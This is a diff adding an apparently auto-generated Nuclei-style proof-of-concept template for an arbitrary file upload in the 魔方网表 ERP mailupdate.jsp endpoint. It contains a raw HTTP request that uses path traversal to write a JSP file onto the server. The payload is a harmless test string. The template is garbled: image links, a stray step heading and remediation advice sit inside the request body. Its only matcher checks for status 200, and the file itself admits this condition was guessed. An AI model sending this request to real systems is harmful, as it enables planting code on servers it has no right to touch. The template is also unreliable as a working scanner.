@@ -1,0 +1,53 @@
+id: poc-wh2rn4x9vt2gti26
+info:
+  name: 魔方网表ERP mailupdate.jsp 任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wh2rn4x9vt2gti26
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wh2rn4x9vt2gti26
+http:
+- raw:
+  - 'GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../qwe.jsp&messagecontent=%3C%25+out.println%28%22hello%22%29%3B%25%3E HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+
+    Accept-Encoding: identity
+
+
+    Accept: */*
+
+
+    Connection: keep-alive
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058064862-59161071-f2bb-4356-8011-9bb0b2c61686.png)
+
+
+    3、上传文件名
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058065690-8afcdcd5-7d5d-48b6-9fc2-f12e72f2d1f8.png)
+
+
+    ## 修复建议
+
+    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。
+
+    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。
+
+    </font><font style="color:#333333;">3、设置白名单访问。</font>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
